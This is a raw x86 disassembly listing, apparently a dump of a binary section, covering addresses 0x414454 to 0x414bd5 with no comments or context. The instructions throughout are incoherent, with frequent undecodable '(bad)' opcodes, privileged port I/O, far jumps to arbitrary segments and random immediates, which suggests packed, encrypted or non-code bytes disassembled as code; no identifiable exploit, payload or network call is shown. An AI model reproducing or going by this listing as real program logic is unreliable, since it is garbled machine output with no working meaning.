  414454:	sbb    edx,esi
  414456:	loope  0x414414
  414458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414459:	inc    eax
  41445a:	icebp  
  41445b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41445c:	in     eax,dx
  41445d:	sub    cl,BYTE PTR [eax]
  41445f:	lods   eax,DWORD PTR ds:[esi]
  414460:	loop   0x4144af
  414462:	fnstenv [edi]
  414464:	pop    ecx
  414465:	pop    ecx
  414466:	popf   
  414467:	arpl   WORD PTR [edi-0x74fc1109],dx
  41446d:	dec    esp
  41446e:	mov    ds:0xf4cb9c53,eax
  414473:	lds    eax,FWORD PTR [ebx-0x78c06d0c]
  414479:	andps  xmm4,xmm1
  41447c:	add    DWORD PTR [edx+0x6c],esi
  41447f:	cmc    
  414480:	lods   eax,DWORD PTR ds:[esi]
  414481:	imul   DWORD PTR [esi-0x63]
  414484:	mov    esp,0xce3982ba
  414489:	repnz cmp BYTE PTR [edx-0x63],dh
  41448d:	repnz adc DWORD PTR ds:[ecx+eax*8-0x62194dc2],ebp
  414496:	lahf   
  414497:	mov    eax,0x6a65a52a
  41449c:	inc    edi
  41449d:	adc    eax,0x39788ca1
  4144a2:	sub    al,0x4a
  4144a4:	jl     0x41451c
  4144a6:	mov    esi,DWORD PTR [edi]
  4144a8:	mov    ebp,0xbf232f7
  4144ad:	push   ecx
  4144ae:	xor    BYTE PTR [eax-0x25b6a0ab],dl
  4144b4:	adc    al,0x4b
  4144b6:	cld    
  4144b7:	xchg   DWORD PTR [esi+edi*2+0x2f],ebx
  4144bb:	xchg   esp,eax
  4144bc:	stos   BYTE PTR es:[edi],al
  4144bd:	or     eax,0xfb189202
  4144c2:	sbb    al,0xfe
  4144c4:	mov    WORD PTR [ecx-0x5e],?
  4144c7:	jo     0x41453d
  4144c9:	ds scas eax,DWORD PTR es:[edi]
  4144cb:	or     edx,ebx
  4144cd:	inc    ecx
  4144ce:	int3   
  4144cf:	pop    edx
  4144d0:	cmc    
  4144d1:	dec    edx
  4144d2:	dec    BYTE PTR [ebp-0x76]
  4144d5:	add    eax,0xf490047
  4144da:	(bad)  
  4144db:	jb     0x4144d0
  4144dd:	in     ax,dx
  4144df:	fcomp  DWORD PTR [ebp-0x5f56f317]
  4144e5:	inc    edx
  4144e6:	inc    eax
  4144e7:	mov    ebp,0x1ebe7d87
  4144ec:	pop    es
  4144ed:	icebp  
  4144ee:	scas   eax,DWORD PTR es:[edi]
  4144ef:	adc    al,bh
  4144f1:	push   eax
  4144f2:	sub    eax,0xccf0722f
  4144f7:	mov    eax,ds:0x7f17ef4f
  4144fc:	sub    cl,BYTE PTR [edx]
  4144fe:	inc    esi
  4144ff:	and    BYTE PTR [edx],bl
  414501:	jns    0x414558
  414503:	inc    ebp
  414504:	rol    BYTE PTR [esi+0x67],0xfd
  414508:	xchg   DWORD PTR [esi+0x1646b279],ebx
  41450e:	sti    
  41450f:	aam    0x92
  414511:	sbb    esp,edi
  414513:	stos   DWORD PTR es:[edi],eax
  414514:	push   esi
  414515:	jo     0x41456d
  414517:	jbe    0x41452f
  414519:	outs   dx,BYTE PTR ds:[esi]
  41451a:	clc    
  41451b:	sahf   
  41451c:	lock lea esp,[edi-0x1c046f90]
  414523:	into   
  414524:	cs mov edx,0xad4b8761
  41452a:	sub    eax,0xd268acda
  41452f:	jno    0x41454c
  414531:	retf   
  414532:	push   cs
  414533:	mov    al,0x8a
  414535:	xor    al,0x43
  414537:	repnz scas al,BYTE PTR es:[edi]
  414539:	xor    al,0xad
  41453b:	push   es
  41453c:	push   eax
  41453d:	inc    ebp
  41453e:	and    ah,BYTE PTR [esi+0x2]
  414541:	clc    
  414542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414543:	sti    
  414544:	sti    
  414545:	ins    BYTE PTR es:[edi],dx
  414546:	mov    DWORD PTR [ebp+0x32],0xfa2ae755
  41454d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41454e:	or     BYTE PTR [edx],cl
  414550:	pop    ebp
  414551:	and    al,0x5b
  414553:	and    ecx,DWORD PTR [ecx-0x2b]
  414556:	fiadd  WORD PTR [ebp-0x6c]
  414559:	dec    edi
  41455a:	xchg   ecx,eax
  41455b:	or     ebx,edx
  41455d:	enter  0x8242,0x97
  414561:	rcr    BYTE PTR [ecx],0xb8
  414564:	fsubp  st(5),st
  414566:	mov    eax,0x23cc7a3d
  41456b:	stos   BYTE PTR es:[edi],al
  41456c:	dec    ebx
  41456d:	(bad)  
  41456e:	aam    0xf6
  414570:	mov    esi,0x5f26ee1c
  414575:	xor    dh,BYTE PTR [ebp+0x413ab0d8]
  41457b:	sub    al,BYTE PTR [edi+0x71]
  41457e:	jle    0x41459a
  414580:	out    0xd8,eax
  414582:	cmp    DWORD PTR [eax+0x6d98021c],edx
  414588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414589:	xchg   DWORD PTR [edi-0x23],esi
  41458c:	pusha  
  41458d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41458e:	pop    ss
  41458f:	ja     0x4145ce
  414591:	mov    WORD PTR [eax+eax*1-0x2d],ds
  414595:	push   edi
  414596:	shl    bl,cl
  414598:	scas   eax,DWORD PTR es:[edi]
  414599:	add    DWORD PTR [eax+0x6d020ef8],edx
  41459f:	sub    dl,BYTE PTR [edx-0x20ffc47a]
  4145a5:	in     eax,0xff
  4145a7:	inc    edi
  4145a8:	dec    ebx
  4145a9:	nop
  4145aa:	add    bl,dh
  4145ac:	push   cs
  4145ad:	(bad)  
  4145ae:	repnz push esi
  4145b0:	dec    ebp
  4145b1:	mov    ds:0x3a49762c,eax
  4145b6:	loopne 0x41453d
  4145b8:	sub    eax,0xaf0dbc85
  4145bd:	sub    DWORD PTR [edx-0x3d],0xea2c9f66
  4145c4:	(bad)  
  4145c5:	xchg   edi,eax
  4145c6:	jns    0x414612
  4145c8:	push   cs
  4145c9:	cmp    edi,edx
  4145cb:	mov    eax,ds:0xf98d44cc
  4145d0:	imul   ebx,DWORD PTR [edx],0x76c9b71d
  4145d6:	enter  0x58c5,0x45
  4145da:	dec    edx
  4145db:	or     al,bh
  4145dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145de:	(bad)  
  4145df:	fnstsw WORD PTR [ebp-0x72]
  4145e2:	sub    DWORD PTR [ecx-0xa],ebx
  4145e5:	sbb    esi,DWORD PTR [ecx]
  4145e7:	or     BYTE PTR [ebx-0x764c29cf],dl
  4145ed:	rol    BYTE PTR [ebx+0x19],1
  4145f0:	and    esp,DWORD PTR [edi-0x2739f49a]
  4145f6:	adc    ecx,DWORD PTR [esi-0x55]
  4145f9:	jno    0x4145b4
  4145fb:	mov    eax,ds:0xa51e3469
  414600:	test   BYTE PTR [edi+0x76],cl
  414603:	push   esp
  414604:	dec    eax
  414605:	mov    cs:0xfdcb2c86,eax
  41460b:	cs push esp
  41460d:	in     al,0x77
  41460f:	pop    ds
  414610:	inc    ebp
  414611:	jne    0x4145a6
  414613:	jb     0x4145ab
  414615:	mov    al,ds:0xee886bc7
  41461a:	and    DWORD PTR [ebx-0x1e74d4ef],eax
  414620:	inc    esp
  414621:	stc    
  414622:	mov    edx,0x9ac389e7
  414627:	cdq    
  414628:	in     eax,0xed
  41462a:	push   edx
  41462b:	das    
  41462c:	mov    dh,0x50
  41462e:	bound  eax,QWORD PTR [esp+eax*4+0x18abb678]
  414635:	dec    edx
  414636:	xchg   BYTE PTR [edi],bl
  414638:	adc    eax,DWORD PTR [edx-0x7a]
  41463b:	add    DWORD PTR [ebx+0x1a0d4d2a],esp
  414641:	int    0xc6
  414643:	mov    ebx,0xcbd1a935
  414648:	das    
  414649:	xchg   ecx,eax
  41464a:	(bad)  
  41464b:	ror    DWORD PTR [eax+0x1d],1
  41464e:	cmc    
  41464f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414650:	push   edx
  414651:	and    dh,BYTE PTR [ebp-0x5d]
  414654:	and    DWORD PTR [esi-0x1b6d2977],esi
  41465a:	adc    ch,BYTE PTR [ebx+0x1b]
  41465d:	mov    ch,0xc
  41465f:	fs ins BYTE PTR es:[edi],dx
  414661:	fsubp  st(4),st
  414663:	fwait
  414664:	adc    al,0xdf
  414666:	sbb    eax,0x3d71a701
  41466b:	mov    esi,0x52e43a85
  414670:	push   0x78
  414672:	fild   WORD PTR [esi]
  414674:	arpl   WORD PTR [ebx-0x70f93d57],dx
  41467a:	fs inc ebx
  41467c:	scas   eax,DWORD PTR es:[edi]
  41467d:	jp     0x4146ec
  41467f:	cmp    al,0x26
  414681:	mov    al,ds:0x7e08833c
  414686:	add    DWORD PTR [ecx],edx
  414688:	jmp    0x8d2f:0x8033ab0b
  41468f:	lods   eax,DWORD PTR ds:[esi]
  414690:	push   edx
  414691:	push   DWORD PTR [ecx+0xa]
  414694:	jge    0x414683
  414696:	mov    bl,0x1d
  414698:	mov    ecx,0xb3a2937
  41469d:	cmp    esi,eax
  41469f:	sbb    dl,BYTE PTR [esi-0xb]
  4146a2:	pop    ebx
  4146a3:	scas   eax,DWORD PTR es:[edi]
  4146a4:	cmp    al,0x84
  4146a6:	out    dx,al
  4146a7:	leave  
  4146a8:	ficomp DWORD PTR ds:0x4db2870f
  4146ae:	(bad)  
  4146af:	stos   BYTE PTR es:[edi],al
  4146b0:	mov    ebp,0x9e761cc9
  4146b5:	and    edi,edi
  4146b7:	mov    esi,0xb411315c
  4146bc:	fsubr  st,st(7)
  4146be:	sub    eax,0x6184a7d6
  4146c3:	ret    
  4146c4:	adc    eax,0x9ff9d91d
  4146c9:	cli    
  4146ca:	shl    bh,0x88
  4146cd:	fcmovbe st,st(6)
  4146cf:	mov    BYTE PTR [eax],bh
  4146d1:	push   0x58
  4146d3:	xor    edx,DWORD PTR [ecx]
  4146d5:	mov    gs,edx
  4146d7:	xchg   edx,eax
  4146d8:	cld    
  4146d9:	or     DWORD PTR [ebx-0x6e84921],ecx
  4146df:	call   0x2a3:0x4e84b241
  4146e6:	sti    
  4146e7:	push   ecx
  4146e8:	popa   
  4146e9:	sbb    DWORD PTR [edx+edi*2],0xf45c5e19
  4146f0:	ja     0x4146fb
  4146f2:	mov    eax,ds:0xfe21a0f8
  4146f7:	adc    bh,bh
  4146f9:	jg     0x4146c9
  4146fb:	mov    ebx,0x6bec35c4
  414700:	arpl   cx,si
  414702:	data16 sbb BYTE PTR [esi],bh
  414705:	mov    edi,0xc8a9e9cf
  41470a:	fidiv  WORD PTR [edx+edi*8+0x16]
  41470e:	mov    DWORD PTR [eax+0x52],eax
  414711:	mov    ch,0x21
  414713:	out    dx,eax
  414714:	mov    dh,0x36
  414716:	pop    edx
  414717:	jmp    0xcb92a564
  41471c:	mov    eax,ds:0x87b65e5a
  414721:	pop    eax
  414722:	test   DWORD PTR [eax+ebx*8],edx
  414725:	pop    esp
  414726:	pop    eax
  414727:	mov    esp,0x3d8656d
  41472c:	les    edx,FWORD PTR [eax-0x67]
  41472f:	mul    DWORD PTR [esi-0x6c]
  414732:	retf   
  414733:	push   cs
  414734:	leave  
  414735:	and    al,0x8d
  414737:	pop    ebx
  414738:	or     eax,0x5857ba26
  41473d:	out    dx,eax
  41473e:	js     0x4147af
  414740:	adc    BYTE PTR [ebx+esi*4],dh
  414743:	mov    dh,0xe5
  414745:	daa    
  414746:	out    0x28,eax
  414748:	in     al,dx
  414749:	hlt    
  41474a:	or     esp,edi
  41474c:	cdq    
  41474d:	or     eax,DWORD PTR [ecx+edx*8]
  414750:	and    esi,DWORD PTR [eax]
  414752:	fist   WORD PTR [ebx+0x13]
  414755:	xor    dl,BYTE PTR [eax-0x4d95460d]
  41475b:	adc    DWORD PTR [edx],esp
  41475d:	inc    ebx
  41475e:	ds jle 0x414788
  414761:	sbb    ebx,0xbeae449d
  414767:	jl     0x4147a7
  414769:	and    dl,0x2b
  41476c:	icebp  
  41476d:	std    
  41476e:	adc    al,0xbe
  414770:	jae    0x414747
  414772:	aam    0x53
  414774:	or     bh,BYTE PTR [edi+eiz*1]
  414777:	jmp    0x4146f9
  414779:	adc    eax,0xf1e576a3
  41477e:	xchg   ebx,eax
  41477f:	add    edi,edx
  414781:	xor    eax,0x2f92cf3b
  414786:	das    
  414787:	(bad)  
  414789:	fldcw  WORD PTR [esi]
  41478b:	jg     0x414710
  41478d:	in     al,dx
  41478e:	inc    esi
  41478f:	xchg   DWORD PTR [ebx-0x7d],esi
  414792:	and    DWORD PTR [edx-0x33],esp
  414795:	push   eax
  414796:	dec    edx
  414797:	fdivrp st(4),st
  414799:	addr16 (bad) 
  41479b:	test   eax,0x74496bdd
  4147a0:	mov    eax,ds:0x411e2ee7
  4147a5:	jmp    0x97db:0x5e55732
  4147ac:	js     0x41473c
  4147ae:	ds out dx,al
  4147b0:	cmp    eax,0xc165739d
  4147b5:	pop    ss
  4147b6:	fild   QWORD PTR [ebp-0x5a]
  4147b9:	leave  
  4147ba:	retf   0x2883
  4147bd:	xor    DWORD PTR [ebp+0x78],ecx
  4147c0:	ins    DWORD PTR es:[edi],dx
  4147c1:	stc    
  4147c2:	mov    ecx,0xf512c27b
  4147c7:	jmp    0x414834
  4147c9:	jecxz  0x414846
  4147cb:	pop    ebp
  4147cc:	imul   esp,DWORD PTR [ebp-0x79],0x7b
  4147d0:	inc    esp
  4147d1:	cmp    BYTE PTR [edx+edi*4],al
  4147d4:	jae    0x4147d3
  4147d6:	into   
  4147d7:	adc    al,0xbc
  4147d9:	(bad)  
  4147da:	jns    0x4147fb
  4147dc:	fcomp  st(4)
  4147de:	lea    esp,[ecx]
  4147e0:	retf   0xf61f
  4147e3:	iret   
  4147e4:	gs test al,ch
  4147e7:	push   esp
  4147e8:	xor    al,0x53
  4147ea:	mov    eax,ds:0x39634f8d
  4147ef:	jae    0x4147e7
  4147f1:	(bad)  
  4147f2:	and    eax,0x82920c57
  4147f7:	lahf   
  4147f8:	gs mov dl,0x8c
  4147fb:	(bad)  
  4147fd:	push   es
  4147fe:	ins    DWORD PTR es:[edi],dx
  4147ff:	hlt    
  414800:	jg     0x414870
  414802:	inc    ebp
  414803:	inc    esi
  414804:	call   0x9ec1d9e
  414809:	in     eax,dx
  41480a:	fcom   DWORD PTR [ebx+eiz*8]
  41480d:	mov    gs,WORD PTR [ebx]
  41480f:	shr    DWORD PTR [ebx],1
  414811:	in     al,0xc5
  414813:	sub    eax,0x1086a7e
  414818:	or     al,0x15
  41481a:	xchg   esp,eax
  41481b:	fst    st(6)
  41481d:	mov    dl,0x39
  41481f:	aaa    
  414820:	scas   al,BYTE PTR es:[edi]
  414821:	jl     0x414891
  414823:	int3   
  414824:	repnz enter 0xf67c,0x98
  414829:	ret    
  41482a:	popf   
  41482b:	into   
  41482c:	adc    eax,0x50385ed2
  414831:	aad    0xea
  414833:	mov    dl,0xf0
  414835:	push   edi
  414836:	repz push ebx
  414838:	jae    0x414888
  41483a:	sub    bh,BYTE PTR [edx+0x30255543]
  414840:	jno    0x4147cc
  414842:	inc    eax
  414843:	mov    ch,0x1c
  414845:	and    al,0xab
  414847:	arpl   WORD PTR [edi+0x6640b787],cx
  41484d:	rep ins DWORD PTR es:[edi],dx
  41484f:	dec    eax
  414850:	push   esp
  414851:	dec    DWORD PTR [esi]
  414853:	jne    0x414813
  414855:	jle    0x414880
  414857:	ins    BYTE PTR es:[edi],dx
  414858:	inc    esp
  414859:	jl     0x41481f
  41485b:	repz (bad) 
  41485d:	and    al,0x54
  41485f:	fcom   QWORD PTR [esi]
  414861:	es out dx,al
  414863:	stos   BYTE PTR es:[edi],al
  414864:	mov    BYTE PTR [ecx+0x78f1c8f6],0xcf
  41486b:	div    DWORD PTR [eax+0x61]
  41486e:	adc    bl,BYTE PTR [edx-0x5b]
  414871:	mov    ch,0x17
  414873:	out    0x78,al
  414875:	std    
  414876:	aas    
  414877:	add    bh,BYTE PTR [ebp-0x7b4319f2]
  41487d:	sbb    BYTE PTR ds:0x7d5393b3,cl
  414883:	pop    ecx
  414884:	xchg   ecx,eax
  414885:	mov    ds:0xce1c2d0f,eax
  41488a:	xor    dl,BYTE PTR [eax]
  41488c:	ins    DWORD PTR es:[edi],dx
  41488d:	fmul   DWORD PTR [esi]
  41488f:	aas    
  414890:	mul    BYTE PTR [ecx]
  414892:	sbb    bl,BYTE PTR ds:0x81c47bc2
  414898:	mov    al,0x71
  41489a:	(bad)  
  41489b:	fs mov dl,0x57
  41489e:	in     eax,0x59
  4148a0:	(bad)  
  4148a1:	into   
  4148a2:	jge    0x41487b
  4148a4:	fdiv   DWORD PTR [esi]
  4148a6:	mov    esi,0x3037c800
  4148ab:	inc    esi
  4148ac:	aaa    
  4148ad:	pop    ebx
  4148ae:	sbb    al,0x70
  4148b0:	cld    
  4148b1:	mov    esp,0x787b51dd
  4148b6:	jle    0x4148fd
  4148b8:	cmp    cl,BYTE PTR [ebx]
  4148ba:	xchg   esi,eax
  4148bb:	sub    bh,bl
  4148bd:	xchg   edx,eax
  4148be:	clc    
  4148bf:	sar    DWORD PTR [eax+0x4ec2500f],0xc
  4148c6:	mov    ch,0x5a
  4148c8:	sbb    BYTE PTR [ebp-0x2c],ah
  4148cb:	jl     0x4148c0
  4148cd:	or     eax,DWORD PTR [ebp+eax*2+0x4f]
  4148d1:	outs   dx,DWORD PTR ds:[esi]
  4148d2:	push   ecx
  4148d3:	xchg   ebp,eax
  4148d4:	out    dx,al
  4148d5:	or     eax,0xfb9fca46
  4148da:	mov    DWORD PTR [ecx-0x2c],ebp
  4148dd:	adc    BYTE PTR [ebp-0x620be147],dl
  4148e3:	cmp    edx,DWORD PTR [ecx+ebx*4]
  4148e6:	lods   al,BYTE PTR ds:[esi]
  4148e7:	dec    ebp
  4148e8:	test   eax,0x324af88e
  4148ed:	or     DWORD PTR [ebx+ecx*4-0x2096885f],ebx
  4148f4:	mov    ds:0x60d258c0,al
  4148f9:	inc    edx
  4148fa:	shl    DWORD PTR ds:0x3a26e6b4,cl
  414900:	pop    ds
  414901:	mov    DWORD PTR [esi+0x7],ebp
  414904:	pop    esp
  414905:	xchg   BYTE PTR [eax+0x22],al
  414908:	mov    esi,0xbed45b4a
  41490d:	sub    DWORD PTR [ecx+esi*1+0x38],ebp
  414911:	jmp    0x662b8de9
  414916:	pop    esi
  414917:	into   
  414918:	rcr    DWORD PTR [esi+0xcb8e975],0xef
  41491f:	retf   
  414920:	sti    
  414921:	or     ch,dh
  414923:	adc    DWORD PTR [edi],ebx
  414925:	jle    0x41494b
  414927:	add    eax,DWORD PTR [eax-0x52f222ec]
  41492d:	inc    ebx
  41492e:	jp     0x4148dd
  414930:	or     dl,ch
  414932:	loope  0x4149a9
  414934:	test   DWORD PTR [esi+0x64],edi
  414937:	scas   al,BYTE PTR es:[edi]
  414938:	loope  0x4149a3
  41493a:	mov    ebx,0xfe822846
  41493f:	mov    BYTE PTR [ecx+0x6f],al
  414942:	arpl   WORD PTR [eax+0x7096e5f8],bx
  414948:	dec    ebp
  414949:	add    al,BYTE PTR [edi-0x4d7cdf92]
  41494f:	cmp    bh,BYTE PTR [ecx+esi*4]
  414952:	test   al,0xb
  414954:	mov    ch,0x74
  414956:	jae    0x4148e4
  414958:	inc    esp
  414959:	xor    al,0x71
  41495b:	call   ebp
  41495d:	in     eax,0x8c
  41495f:	xchg   BYTE PTR [ecx-0x2a],dl
  414962:	(bad)  
  414963:	out    dx,eax
  414964:	add    eax,0xa1e2782e
  414969:	in     al,0x39
  41496b:	das    
  41496c:	retf   
  41496d:	and    al,BYTE PTR [ebp-0x52051b0a]
  414973:	fs stos DWORD PTR es:[edi],eax
  414975:	rcl    DWORD PTR [ebx-0x7084717a],1
  41497b:	jo     0x414983
  41497d:	(bad)  
  41497e:	or     al,0x94
  414980:	imul   edx,DWORD PTR [ecx],0xffffffd1
  414983:	push   ecx
  414984:	mov    esp,0xd6181fc8
  414989:	and    BYTE PTR [eax+0x7cd9bdb3],0xc8
  414990:	out    0xee,al
  414992:	sbb    al,0x9c
  414994:	mov    edx,0xc35b95d7
  414999:	sub    DWORD PTR [esi],edi
  41499b:	jnp    0x4149b4
  41499d:	in     eax,0x32
  41499f:	mov    edx,0x74b3d696
  4149a4:	ins    BYTE PTR es:[edi],dx
  4149a5:	mov    ds:0x983fe5ca,eax
  4149aa:	test   DWORD PTR [ebp+0x2e],ebp
  4149ad:	cld    
  4149ae:	aad    0xe5
  4149b0:	sar    BYTE PTR cs:[ecx+0x42],cl
  4149b4:	push   esi
  4149b5:	mov    ah,0x68
  4149b7:	jne    0x4149bc
  4149b9:	cmc    
  4149ba:	scas   eax,DWORD PTR es:[edi]
  4149bb:	sbb    ah,BYTE PTR [ecx+eax*1]
  4149be:	jp     0x414987
  4149c0:	sbb    esp,edx
  4149c2:	xlat   BYTE PTR ds:[ebx]
  4149c3:	pop    ebp
  4149c4:	xor    eax,0xf4224e93
  4149c9:	sti    
  4149ca:	data16 (bad) 
  4149cc:	fwait
  4149cd:	xchg   esi,eax
  4149ce:	fdiv   QWORD PTR [edi]
  4149d0:	daa    
  4149d1:	push   eax
  4149d2:	add    BYTE PTR [ecx+edi*1-0x25c412fc],0xb1
  4149da:	imul   ebp,DWORD PTR [eax+0x63],0xffffffdd
  4149de:	push   edx
  4149df:	sbb    eax,0xa96843c
  4149e4:	adc    esp,DWORD PTR [edx]
  4149e6:	push   ebp
  4149e7:	dec    esi
  4149e8:	in     al,dx
  4149e9:	sub    al,al
  4149eb:	sbb    eax,0xe726edaa
  4149f0:	aam    0x52
  4149f2:	lea    edx,[ecx+0x1b]
  4149f5:	and    BYTE PTR [ebx+esi*2+0x5f],bl
  4149f9:	pop    ebp
  4149fa:	loopne 0x414a1f
  4149fc:	fwait
  4149fd:	hlt    
  4149fe:	repnz lods eax,DWORD PTR ds:[esi]
  414a00:	adc    esi,DWORD PTR [ebx+0x49]
  414a03:	and    eax,0xed966bec
  414a08:	jo     0x4149a1
  414a0a:	loope  0x4149fb
  414a0c:	xchg   DWORD PTR [esi-0x61],ebp
  414a0f:	inc    esp
  414a10:	mov    dh,dh
  414a12:	pushf  
  414a13:	loopne 0x4149a2
  414a15:	or     BYTE PTR [esi],dl
  414a17:	mov    al,0x9d
  414a19:	pop    edi
  414a1a:	jle    0x4149e6
  414a1c:	imul   esi,DWORD PTR [eax-0x3f],0x23
  414a20:	jb     0x4149a3
  414a22:	jne    0x414a57
  414a24:	sub    cl,dl
  414a26:	mov    esp,0x4aeacd8b
  414a2b:	mov    ebp,0x23c2d316
  414a30:	jmp    0x4149c4
  414a32:	ficom  WORD PTR [ecx-0x242df75a]
  414a38:	hlt    
  414a39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a3a:	and    ecx,DWORD PTR [ebx]
  414a3c:	pop    eax
  414a3d:	outs   dx,DWORD PTR ds:[esi]
  414a3e:	(bad)  
  414a40:	fcomp  QWORD PTR [ebx+0x24]
  414a43:	out    dx,eax
  414a44:	inc    eax
  414a45:	stos   BYTE PTR es:[edi],al
  414a46:	imul   DWORD PTR [edx+0x54]
  414a49:	sbb    BYTE PTR [ecx-0x4cefec76],0xc1
  414a50:	push   ebp
  414a51:	pop    ebx
  414a52:	jmp    0x414a33
  414a54:	mov    ds:0x670ab00e,eax
  414a59:	loop   0x4149eb
  414a5b:	xlat   BYTE PTR ds:[ebx]
  414a5c:	mov    ebp,0x84107148
  414a61:	les    edi,FWORD PTR [ebp-0x7d]
  414a64:	dec    BYTE PTR [edi]
  414a66:	aad    0xce
  414a68:	adc    al,0xa3
  414a6a:	test   BYTE PTR [eax-0x54],0x44
  414a6e:	sbb    BYTE PTR [ebp+0x18],bh
  414a71:	add    DWORD PTR [ebx],0x3d
  414a74:	mov    esp,0x3fd9b882
  414a79:	(bad)  
  414a7b:	mov    esp,0x691821fd
  414a81:	adc    dl,BYTE PTR [ebx+0x7e5f61eb]
  414a87:	sub    ebp,DWORD PTR [eax]
  414a89:	lods   al,BYTE PTR ds:[esi]
  414a8a:	jg     0x414b0a
  414a8c:	dec    edi
  414a8d:	push   ebp
  414a8e:	sbb    DWORD PTR [ecx-0x2],0xef62bf3a
  414a95:	adc    DWORD PTR [edi-0x76],0xffffff9f
  414a99:	mov    dh,0xab
  414a9b:	inc    DWORD PTR [ebp+0x7314e0d0]
  414aa1:	stos   DWORD PTR es:[edi],eax
  414aa2:	sbb    ebp,DWORD PTR [ebx]
  414aa4:	pop    edx
  414aa5:	cmp    BYTE PTR [edi],dl
  414aa7:	aam    0xd2
  414aa9:	(bad)  
  414aaa:	and    ch,BYTE PTR [edi+0x3b]
  414aad:	pop    es
  414aae:	xor    bh,BYTE PTR [esi+esi*8+0x6a]
  414ab2:	inc    esi
  414ab3:	fsubr  QWORD PTR [ebp+0x4c]
  414ab6:	dec    ecx
  414ab7:	fnsave [edi+esi*1+0x7f]
  414abb:	cmp    cl,BYTE PTR [ebx+0x17]
  414abe:	or     al,0x4f
  414ac0:	dec    ecx
  414ac1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ac2:	aas    
  414ac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ac4:	push   ebx
  414ac5:	out    dx,eax
  414ac6:	scas   al,BYTE PTR es:[edi]
  414ac7:	adc    BYTE PTR [eax-0x64],bl
  414aca:	pop    edx
  414acb:	sti    
  414acc:	dec    esp
  414acd:	ror    DWORD PTR [eax+ebx*1-0x58e23bbd],1
  414ad4:	mov    bh,BYTE PTR [edx-0x2e]
  414ad7:	lock stos BYTE PTR es:[edi],al
  414ad9:	pop    eax
  414ada:	fucom  st(6)
  414adc:	nop
  414add:	jle    0x414b24
  414adf:	sbb    DWORD PTR [ebp+eiz*2-0x70],esp
  414ae3:	fcom   QWORD PTR [esi]
  414ae5:	shr    DWORD PTR [ecx+esi*4-0x338c0ca0],0x22
  414aed:	dec    eax
  414aee:	dec    edx
  414aef:	mov    ch,0xf2
  414af1:	ret    
  414af2:	ret    
  414af3:	push   ebx
  414af4:	inc    edi
  414af5:	inc    esp
  414af6:	paddsb mm5,QWORD PTR [edx]
  414af9:	scas   eax,DWORD PTR es:[edi]
  414afa:	bound  ecx,QWORD PTR [eax-0x53]
  414afd:	push   edx
  414afe:	add    DWORD PTR [edi],ebx
  414b00:	inc    edx
  414b01:	test   eax,0x47080f67
  414b06:	mov    ds:0x137f791,eax
  414b0b:	bound  esp,QWORD PTR [edi-0x62]
  414b0e:	stos   BYTE PTR es:[edi],al
  414b0f:	popa   
  414b10:	outs   dx,DWORD PTR ds:[esi]
  414b11:	dec    edx
  414b12:	ins    DWORD PTR es:[edi],dx
  414b13:	les    ecx,FWORD PTR [edi+0x4]
  414b16:	and    DWORD PTR [esi],ebx
  414b18:	push   0x45b200bf
  414b1d:	out    dx,eax
  414b1e:	dec    eax
  414b1f:	sub    al,0xe4
  414b21:	scas   eax,DWORD PTR es:[edi]
  414b22:	sub    eax,0x7690741b
  414b27:	jecxz  0x414b6f
  414b29:	ror    BYTE PTR [esi-0x74f3e893],0xce
  414b30:	sbb    BYTE PTR [eax+eiz*8+0x2cc33630],ch
  414b37:	mov    DWORD PTR [esi-0x1cadbb53],ebx
  414b3d:	inc    eax
  414b3e:	es mov bh,0x19
  414b41:	inc    eax
  414b42:	and    BYTE PTR [edx+0x5d],ah
  414b45:	lock rcl al,1
  414b48:	test   al,0x75
  414b4a:	les    edx,FWORD PTR [edi]
  414b4c:	sar    DWORD PTR [ebp+0x22abea54],0x69
  414b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b54:	mov    eax,0xc16ccb7f
  414b59:	cs sbb eax,0xb5405079
  414b5f:	mov    al,0x41
  414b61:	ins    BYTE PTR es:[edi],dx
  414b62:	(bad)  
  414b63:	mov    ch,al
  414b65:	inc    esp
  414b66:	inc    eax
  414b67:	mov    ds:0xba4d85b4,eax
  414b6c:	jae    0x414b37
  414b6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b6f:	cmp    ah,BYTE PTR [ebp-0x59]
  414b72:	das    
  414b73:	push   edx
  414b74:	stos   BYTE PTR es:[edi],al
  414b75:	ficomp WORD PTR [edi-0x48b0780f]
  414b7b:	or     eax,0xacabf610
  414b80:	jp     0x414bbf
  414b82:	inc    esi
  414b83:	xor    al,0xfc
  414b85:	sbb    DWORD PTR [ebx-0x26],eax
  414b88:	and    ah,bh
  414b8a:	xor    BYTE PTR [esi+ebx*2+0x78],ch
  414b8e:	or     ch,BYTE PTR [ebx]
  414b90:	sbb    eax,0xf27abd51
  414b95:	bound  edx,QWORD PTR es:[edi-0x67371b3b]
  414b9c:	sti    
  414b9d:	cmp    al,0x34
  414b9f:	outs   dx,DWORD PTR ds:[esi]
  414ba0:	and    eax,0xa0fdb5b
  414ba5:	or     BYTE PTR [esi],ah
  414ba7:	lahf   
  414ba8:	lods   eax,DWORD PTR ds:[esi]
  414ba9:	inc    eax
  414baa:	(bad)  
  414bab:	jnp    0x414b95
  414bad:	add    ecx,DWORD PTR [ebx-0x8]
  414bb0:	xchg   ebp,eax
  414bb1:	out    dx,al
  414bb2:	adc    bl,BYTE PTR [esi+0x6015d993]
  414bb8:	xchg   esp,eax
  414bb9:	ror    BYTE PTR [edx+0x772ef343],0x24
  414bc0:	mov    dh,0x2e
  414bc2:	mov    al,0xa8
  414bc4:	fadd   QWORD PTR [ecx+0x3]
  414bc7:	jge    0x414bbf
  414bc9:	dec    esi
  414bca:	add    edi,ecx
  414bcc:	xor    DWORD PTR [ebp-0x644d3bb1],edi
  414bd2:	lds    edx,FWORD PTR [esi+0x4b]
  414bd5:	mov    ch,0x50
